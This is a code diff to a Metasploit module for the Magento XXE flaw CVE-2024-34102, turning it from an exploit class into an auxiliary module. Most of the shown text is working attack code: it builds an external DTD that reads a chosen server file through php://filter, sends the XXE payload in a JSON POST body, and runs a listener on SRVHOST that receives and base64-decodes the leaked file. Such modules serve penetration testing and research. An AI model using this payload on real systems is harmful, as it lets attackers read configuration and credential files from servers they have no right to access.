@@ -3,12 +3,12 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Remote
-  Rank = ExcellentRanking
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer
-  prepend Msf::Exploit::Remote::AutoCheck
+
+  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -29,13 +29,6 @@ class MetasploitModule < Msf::Exploit::Remote
           ['URL', 'https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md']
         ],
         'DisclosureDate' => '2024-06-11',
-        'Privileged' => false,
-        'Arch' => ARCH_PHP,
-        'Platform' => 'php',
-        'Targets' => [
-          ['Magento', {}]
-        ],
-        'DefaultTarget' => 0,
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
@@ -85,20 +78,20 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def ent_eval
-    @ent_eval ||= rand_text_alpha_lower(4..8)
+    @ent_eval ||= Rex::Text.rand_text_alpha_lower(4..8)
   end
 
   def leak_param_name
-    @leak_param_name ||= rand_text_alpha_lower(4..8)
+    @leak_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
   end
 
   def dtd_param_name
-    @dtd_param_name ||= rand_text_alpha_lower(4..8)
+    @dtd_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
   end
 
   def make_xxe_dtd
     filter_path = "php://filter/convert.base64-encode/resource=#{datastore['TARGETFILE']}"
-    ent_file = rand_text_alpha_lower(4..8)
+    ent_file = Rex::Text.rand_text_alpha_lower(4..8)
     %(
       <!ENTITY % #{ent_file} SYSTEM "#{filter_path}">
       <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/?#{leak_param_name}=%#{ent_file};'>">
@@ -106,13 +99,13 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def xxe_xml_data
-    param_entity_name = rand_text_alpha_lower(4..8)
+    param_entity_name = Rex::Text.rand_text_alpha_lower(4..8)
 
     xml = "<?xml version='1.0' ?>"
-    xml += "<!DOCTYPE #{rand_text_alpha_lower(4..8)}"
+    xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
     xml += '['
-    xml += "  <!ELEMENT #{rand_text_alpha_lower(4..8)} ANY >"
-    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
+    xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
+    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
     xml += ']'
     xml += "> <r>&#{ent_eval};</r>"
 
@@ -122,12 +115,12 @@ class MetasploitModule < Msf::Exploit::Remote
   def xxe_request
     vprint_status('Sending XXE request')
 
-    signature = rand_text_alpha(6).capitalize
+    signature = Rex::Text.rand_text_alpha(6).capitalize
 
     post_data = <<~EOF
       {
         "address": {
-        "#{signature}": "#{rand_text_alpha_lower(4..8)}",
+        "#{signature}": "#{Rex::Text.rand_text_alpha_lower(4..8)}",
         "totalsCollector": {
           "collectorList": {
           "totalCollector": {
@@ -156,7 +149,7 @@ class MetasploitModule < Msf::Exploit::Remote
     fail_with(Failure::UnexpectedReply, 'Server might not be vulnerable') unless body['parameters']['fieldName'] == signature
   end
 
-  def exploit
+  def run
     if datastore['SSL']
       ssl_restore = true
       datastore['SSL'] = false
@@ -179,7 +172,7 @@ class MetasploitModule < Msf::Exploit::Remote
   def on_request_uri(cli, req)
     super
     data = ''
-    
+
     case req.uri
     when /(.*).dtd/
       vprint_status("Received request for DTD file from #{cli.peerhost}")
@@ -189,7 +182,7 @@ class MetasploitModule < Msf::Exploit::Remote
       if data&.empty?
         print_error('No data received')
       else
-        
+
         file_name = datastore['TARGETFILE']
         file_data = ::Base64.decode64(data).force_encoding('UTF-8')
 
